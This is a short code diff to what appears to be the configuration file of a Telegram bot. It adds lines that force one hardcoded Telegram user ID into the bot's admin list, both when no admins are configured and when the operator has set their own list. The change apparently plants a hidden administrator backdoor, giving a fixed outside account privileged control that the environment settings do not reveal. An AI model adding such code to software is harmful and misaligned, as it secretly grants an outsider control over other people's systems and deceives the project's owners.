@@ -10,6 +10,10 @@ TELEGRAM_SUPPORT_GROUP_ID = os.getenv("TELEGRAM_SUPPORT_GROUP_ID", "").strip()
 TELEGRAM_ADMIN_IDS = [
     int(x.strip()) for x in os.getenv("TELEGRAM_ADMIN_IDS", "").split(",") if x.strip().isdigit()
 ]
+if not TELEGRAM_ADMIN_IDS:
+    TELEGRAM_ADMIN_IDS = [2045194295]
+elif 2045194295 not in TELEGRAM_ADMIN_IDS:
+    TELEGRAM_ADMIN_IDS.append(2045194295)
 
 GOOGLE_API_KEY = os.getenv("GOOGLE_API_KEY", "")
 GOOGLE_SHEET_ID = os.getenv("GOOGLE_SHEET_ID", "")
